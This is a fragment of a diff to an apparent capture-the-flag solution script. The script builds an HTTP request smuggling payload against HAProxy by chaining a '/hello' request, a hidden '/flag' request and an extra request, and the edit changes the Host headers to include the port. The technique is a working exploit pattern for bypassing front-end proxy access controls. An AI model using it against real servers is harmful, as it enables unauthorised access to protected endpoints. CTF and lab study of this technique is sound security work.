@@ -15,12 +15,12 @@ PORT = 8001
 
 flag_request_builder = Request_Builder()
 flag_request_builder.url = "/flag"
-flag_request_builder.host = HOST
+flag_request_builder.host = "{}:{}".format(HOST, PORT)
 flag_request = flag_request_builder.build()
 
 hello_request_builder = Request_Builder()
 hello_request_builder.url = "/hello"
-hello_request_builder.host = HOST
+hello_request_builder.host = "{}:{}".format(HOST, PORT)
 hello_request_builder.add_content_length_header = True
 # body is empty, because we the flag request after manually
 # but for HAProxy the content-length must be big enough to include the flag request so it will be smuggled
@@ -33,7 +33,7 @@ hello_request = hello_request_builder.build()
 
 extra_request_builder = Request_Builder()
 extra_request_builder.url = "/hello"
-extra_request_builder.host = HOST
+extra_request_builder.host = "{}:{}".format(HOST, PORT)
 extra_request = extra_request_builder.build()
 
 msg = hello_request + flag_request + extra_request
